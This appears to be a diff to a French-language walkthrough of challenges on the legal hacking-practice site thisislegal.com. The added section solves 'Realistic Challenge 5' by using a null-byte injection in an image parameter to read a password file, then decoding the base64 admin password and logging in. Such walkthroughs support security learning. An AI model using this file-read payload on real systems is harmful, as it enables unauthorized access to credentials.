@@ -188,6 +188,21 @@ Use the "--show" option to display all of the cracked passwords reliably
 ```
 aller dans http://www.thisislegal.com/newr/secure/
 
+#Realistic Challenge 5
+faire une recherche. on arrive sur http://www.thisislegal.com/nc/adm/srch/?s=
+aller dans www.thisislegal.com/nc/adm/ => page de login
+validation du formulaire ==>  Details supplied do not match information in login.pwd file. 
+
+affichage de l'image d'un serveur : http://www.thisislegal.com/nc/i.php?img=images/server
+on l'utilise pour afficher le fichier login.pwd
+http://www.thisislegal.com/nc/i.php?img=adm/login.pwd%00
+
+```
+admin:aWFta2luZzEyMw==
+```
+décodage du base64 ==> iamking123
+login avec admin/iamking123
+
 #Bonus challenge 1
 afficher la source (CTRL+U)
 ```
